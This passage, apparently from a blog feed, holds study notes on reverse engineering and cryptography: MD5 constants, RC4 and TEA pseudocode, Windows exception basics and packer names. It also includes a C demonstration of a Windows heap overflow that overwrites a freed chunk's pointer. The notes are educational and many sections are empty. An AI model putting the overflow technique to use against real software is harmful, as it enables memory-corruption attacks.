href="#5-7-Disk-Protection" class="headerlink" title="5.7 - Disk Protection"></a>5.7 - Disk Protection</h2><h2 id="5-8-Single-Instance"><a href="#5-8-Single-Instance" class="headerlink" title="5.8 - Single Instance"></a>5.8 - Single Instance</h2><h1 id="Chapter-6-Cryptography-Algorithm"><a href="#Chapter-6-Cryptography-Algorithm" class="headerlink" title="Chapter 6 - Cryptography Algorithm"></a>Chapter 6 - Cryptography Algorithm</h1><h2 id="6-1-Hashing"><a href="#6-1-Hashing" class="headerlink" title="6.1 - Hashing"></a>6.1 - Hashing</h2><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>MD5 stands for <strong>Message Digest Algorithm 5</strong>.</p><script type="math/tex; mode=display">A = 01234567h\\B = 89abcdefh\\C = fedcba98h\\D = 76543210h\\</script><script type="math/tex; mode=display">\begin{align*}F(X,Y,Z) &= (X\&Y) | ((\sim X)\&Z)\\G(X,Y,Z) &= (X\&Z) | (Y\&(\sim Z))\\H(X,Y,Z) &= X\text{\textasciicircum}Y\text{\textasciicircum}Z\\I(X,Y,Z) &= Y\text{\textasciicircum}(X|(\sim Z))\end{align*}</script><h3 id="SHA"><a href="#SHA" class="headerlink" title="SHA"></a>SHA</h3><p>SHA stands for <strong>Secure Hash Algorithm</strong>.</p><ul><li>SHA-1</li><li>SHA-256</li><li>SHA-384</li><li>SHA-512</li></ul><h2 id="6-2-Symmetric-Encryption"><a href="#6-2-Symmetric-Encryption" class="headerlink" title="6.2 - Symmetric Encryption"></a>6.2 - Symmetric Encryption</h2><ul><li>DES (Data Encryption Standard)</li><li>IDEA (International Data Encryption Algorithm)</li><li>AES (Advanced Encryption Standard)</li><li>BlowFish</li><li>TwoFish</li></ul><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><p>RC4 stands for <strong>Rivest Cipher 4</strong>.</p><p><strong>KSA (Key-Scheduling Algorithm)</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">RC4-KSA(Key)<br>    for i := 0 to 255 do<br>        S[i] := i<br>    end for<br><br>    j := 0<br>    for i := 0 to 255 do<br>        j := (j + S[i] + Key[i mod keylength]) mod 256<br>        swap S[i] and S[j]<br>    end for<br><br>    return S<br><br></code></pre></td></tr></table></figure></p><p><strong>PRGA (Pseudo-Random Generation Algorithm)</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">RC4-PRGA(S)<br>    i := 0<br>    j := 0<br><br>    while true do<br>        i := (i + 1) mod 256<br>        j := (j + S[i]) mod 256<br>        swap S[i] and S[j]<br>        t := (S[i] + S[j]) mod 256<br>        K := S[t]<br>        output K<br>    end while<br></code></pre></td></tr></table></figure></p><h3 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h3><p>TEA stands for <strong>Tiny Encryption Algorithm</strong>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">TEA_Encrypt(v[2], k[4])<br>&#123;<br>    uint32 v0 = v[0], v1 = v[1];<br>    uint32 sum = 0;<br>    uint32 delta = 0x9E3779B9;<br><br>    for (i = 0; i &lt; 32; i++)<br>    &#123;<br>        sum += delta;<br>        v0 += ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[1]);<br>        v1 += ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]);<br>    &#125;<br><br>    v[0] = v0;<br>    v[1] = v1;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">TEA_Decrypt(v[2], k[4])<br>&#123;<br>    uint32 v0 = v[0], v1 = v[1];<br>    uint32 delta = 0x9E3779B9;<br>    uint32 sum = delta * 32;<br><br>    for (i = 0; i &lt; 32; i++)<br>    &#123;<br>        v1 -= ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]);<br>        v0 -= ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[1]);<br>        sum -= delta;<br>    &#125;<br><br>    v[0] = v0;<br>    v[1] = v1;<br>&#125;<br></code></pre></td></tr></table></figure><p>Where:</p><script type="math/tex; mode=display">\begin{align*}delta &= \frac{\sqrt{5} - 1}{2} \times 2^{32}\\&= (\sqrt{5} - 1) \times 2^{31}\end{align*}</script><h3 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h3><h3 id="BlowFish"><a href="#BlowFish" class="headerlink" title="BlowFish"></a>BlowFish</h3><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h1 id="Chapter-7-Windows-Kernel-Fundamentals"><a href="#Chapter-7-Windows-Kernel-Fundamentals" class="headerlink" title="Chapter 7 - Windows Kernel Fundamentals"></a>Chapter 7 - Windows Kernel Fundamentals</h1><h2 id="7-1-Kernel-Fundamentals"><a href="#7-1-Kernel-Fundamentals" class="headerlink" title="7.1 - Kernel Fundamentals"></a>7.1 - Kernel Fundamentals</h2><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/7.1.png'><img src="/images/books/SoftwareCrypto/7.1.png" width="500">    <figcaption>    Source: https://www.linkedin.com/pulse/windows-os-rings-role-event-monitoring-jacob-stickney-thv5c    </figcaption></p><h2 id="7-2-Important-Kernel-Data-Structure"><a href="#7-2-Important-Kernel-Data-Structure" class="headerlink" title="7.2 - Important Kernel Data Structure"></a>7.2 - Important Kernel Data Structure</h2><h2 id="7-3-Fundamentals-of-Kernel-Debugging"><a href="#7-3-Fundamentals-of-Kernel-Debugging" class="headerlink" title="7.3 - Fundamentals of Kernel Debugging"></a>7.3 - Fundamentals of Kernel Debugging</h2><h1 id="Chapter-8-Windows-Exception-Handling"><a href="#Chapter-8-Windows-Exception-Handling" class="headerlink" title="Chapter 8 - Windows Exception Handling"></a>Chapter 8 - Windows Exception Handling</h1><h2 id="8-1-Fundamentals-of-Exception-Handling"><a href="#8-1-Fundamentals-of-Exception-Handling" class="headerlink" title="8.1 - Fundamentals of Exception Handling"></a>8.1 - Fundamentals of Exception Handling</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">VOID RaiseException(<br>  [in] DWORD           dwExceptionCode,<br>  [in] DWORD           dwExceptionFlags,<br>  [in] DWORD           nNumberOfArguments,<br>  [in] const ULONG_PTR *lpArguments<br>);<br><br>//Source: https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-raiseexception<br></code></pre></td></tr></table></figure><p>When an interrupt or exception occurs, the CPU looks up the corresponding handler in the IDT.</p><p>The IDT (Interrupt Descriptor Table) is a linear table stored in memory. It consists of 256 entries. Each entry is 8 bytes long on x86 (32-bit) platforms and 16 bytes long on x64 (64-bit) platforms.</p><p>The base address and size of the IDT are described by the IDTR (IDT Register). The IDTR is 48 bits long on x86 systems. Although the IDTR can be accessed using the SIDT and LIDT instructions, the LIDT instruction can only be executed with Ring 0 privilege.</p><h2 id="8-2-SEH"><a href="#8-2-SEH" class="headerlink" title="8.2 - SEH"></a>8.2 - SEH</h2><h1 id="Chapter-9-Win32-API-Debugging"><a href="#Chapter-9-Win32-API-Debugging" class="headerlink" title="Chapter 9 - Win32 API Debugging"></a>Chapter 9 - Win32 API Debugging</h1><h1 id="Chapter-14-Vulnerability-Techniques"><a href="#Chapter-14-Vulnerability-Techniques" class="headerlink" title="Chapter 14 - Vulnerability Techniques"></a>Chapter 14 - Vulnerability Techniques</h1><h2 id="14-1-Software-Vulnerability"><a href="#14-1-Software-Vulnerability" class="headerlink" title="14.1 - Software Vulnerability"></a>14.1 - Software Vulnerability</h2><h3 id="Stack-Buffer-Overflow"><a href="#Stack-Buffer-Overflow" class="headerlink" title="Stack Buffer Overflow"></a>Stack Buffer Overflow</h3><h3 id="Heap-Buffer-Overflow"><a href="#Heap-Buffer-Overflow" class="headerlink" title="Heap Buffer Overflow"></a>Heap Buffer Overflow</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br>#include &lt;Windows.h&gt;<br><br>int main(int argc, char *argv[]) &#123;<br>    char str[] = &quot;\nHello123456789213456789\n&quot;;<br>    char *a, *b, *c;<br>    long *hHeap;<br>    hHeap = (long *)HeapCreate(0x00040000, 0, 0);<br>    printf(&quot;\n(+) Creating a heap at: 0x00%xh\n&quot;, hHeap);<br>    printf(&quot;(+) Allocating chunk A\n&quot;);<br><br>    a = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);<br>    printf(&quot;(+) Allocating chunk B\n&quot;);<br>    b = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);<br>    printf(&quot;(+) Chunk A=0x00%x\n(+) Chunk=0x00%x\n&quot;, a, b);<br>    printf(&quot;(+) Freeing chunk B to the lookaside\n&quot;);<br>    HeapFree(hHeap, 0, b);<br>    printf(&quot;(+) Now overflow chunk A:\n&quot;);<br><br>    printf(&quot;%x\n&quot;, str);<br>    printf(str);<br>    memcpy(a, &quot;XXXXXXXXXXXXXXXXAAAABBBB\x64\xff\x12\x00&quot;, 28);<br>    printf(&quot;(+) Allocating chunk B\n&quot;);<br>    b = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);<br>    printf(&quot;(+) Allocating chunk C\n&quot;);<br>    c = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMROY, 0x10);<br>    printf(&quot;(+) Chunk A=0x00%x\n(+) Chunk B = 0x00%x\n(+) Chunk C=0x00%x\n&quot;, a, b, c);<br>    strcpy(c, &quot;AAAAAAAAAAAA\n&quot;);<br>    printf(str);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="14-2-Shellcode"><a href="#14-2-Shellcode" class="headerlink" title="14.2 - Shellcode"></a>14.2 - Shellcode</h1><h1 id="CHapter-15-Software-Unpacking"><a href="#CHapter-15-Software-Unpacking" class="headerlink" title="CHapter 15 - Software Unpacking"></a>CHapter 15 - Software Unpacking</h1><h2 id="15-2-Packer"><a href="#15-2-Packer" class="headerlink" title="15.2 - Packer"></a>15.2 - Packer</h2><ul><li>UPX</li><li>ASPack</li></ul><h2 id="15-3-Packer-Stub"><a href="#15-3-Packer-Stub" class="headerlink" title="15.3 - Packer Stub"></a>15.3 - Packer Stub</h2><ul><li>ASProtect</li><li>Armadillo</li><li>EXECryptor</li><li>Themida</li></ul><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="300"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
    <category term="Book" scheme="https://iss4cf0ng.github.io/tags/Book/"/>
    
    <category term="Note" scheme="https://iss4cf0ng.github.io/tags/Note/"/>
    
    <category term="Cryptography" scheme="https://iss4cf0ng.github.io/tags/Cryptography/"/>
    
    <category term="Reverse Engineering" scheme="https://iss4cf0ng.github.io/tags/Reverse-Engineering/"/>
    
    <category term="OllyDbg" scheme="https://iss4cf0ng.github.io/tags/OllyDbg/"/>
    
    <category term="WinDbg" scheme="https://iss4cf0ng.github.io/tags/WinDbg/"/>
    
    <category term="Assembly" scheme="https://iss4cf0ng.github.io/tags/Assembly/"/>
    
    <category term="MD5" scheme="https://iss4cf0ng.github.io/tags/MD5/"/>
    
    <category term="AES" scheme="https://iss4cf0ng.github.io/tags/AES/"/>
    
  </entry>
  
</feed>
